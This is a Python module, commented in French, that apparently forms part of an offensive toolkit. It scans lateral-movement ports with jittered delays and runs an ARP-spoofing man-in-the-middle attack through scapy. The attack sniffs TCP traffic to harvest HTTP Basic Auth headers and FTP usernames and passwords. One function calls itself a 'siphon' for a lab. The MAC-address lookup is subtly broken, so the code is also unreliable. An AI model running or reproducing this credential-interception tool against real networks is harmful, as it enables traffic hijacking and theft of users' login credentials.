import socket
import time
import random
import threading
import sys

class NetworkUtils:
    def __init__(self, config):
        self.config = config
        self.sniffing_active = False
        self.captured = {"http": [], "ftp": [], "telnet": []}

    def ping_host(self, ip):
        try:
            socket.gethostbyaddr(ip)
            return True
        except:
            return False

    def scan_ports(self, ip, ports=[389, 445, 22, 5986]):
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                sock.close()
                time.sleep(random.uniform(0.5, 1.5))
            except:
                pass
        return open_ports

    def arp_spoof(self, target_ip, gateway_ip, duration=60):
        """ARP Spoofing avec restauration automatique"""
        try:
            from scapy.all import ARP, Ether, sendp, sniff
        except ImportError:
            return {"error": "Scapy non installé"}

        def restore_arp(target_ip, gateway_ip):
            """Restaure les tables ARP"""
            packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/packet, count=5, verbose=0)

        def packet_handler(packet):
            if packet.haslayer("IP") and packet.haslayer("TCP"):
                ip = packet["IP"]
                tcp = packet["TCP"]
                payload = bytes(tcp.payload)
                try:
                    payload_str = payload.decode('utf-8', errors='ignore')
                    # HTTP Basic Auth
                    if b'Authorization: Basic' in payload or 'Authorization: Basic' in payload_str:
                        self.captured["http"].append({"src": ip.src, "dst": ip.dst, "data": payload_str[:200]})
                    # FTP
                    if b'USER ' in payload or b'PASS ' in payload:
                        self.captured["ftp"].append({"src": ip.src, "dst": ip.dst, "data": payload_str[:200]})
                except:
                    pass

        # Envoi ARP spoofing
        try:
            # Récupération des MAC
            target_mac = ARP().hwsrc
            gateway_mac = ARP().hwsrc
            # Envoi des paquets ARP en boucle
            def send_arp():
                while self.sniffing_active:
                    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=0)
                    sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=0)
                    time.sleep(2)

            self.sniffing_active = True
            arp_thread = threading.Thread(target=send_arp)
            arp_thread.daemon = True
            arp_thread.start()

            # Sniffing
            sniff(filter="tcp", prn=packet_handler, timeout=duration, store=0)

        except Exception as e:
            return {"error": str(e)}
        finally:
            self.sniffing_active = False
            restore_arp(target_ip, gateway_ip)
            restore_arp(gateway_ip, target_ip)

        return self.captured

    def sniff_traffic(self, duration=60):
        """API simplifiée pour le siphon"""
        # Pour le labo, on simule un sniffing local (loopback) si pas de gateway
        try:
            import socket
            host = socket.gethostbyname(socket.gethostname())
            gateway = host[:-1] + "1"  # Supposition simplifiée
            return self.arp_spoof(host, gateway, duration)
        except:
            return {"captured_http": [], "captured_ftp": []}

    def restore_arp(self):
        return True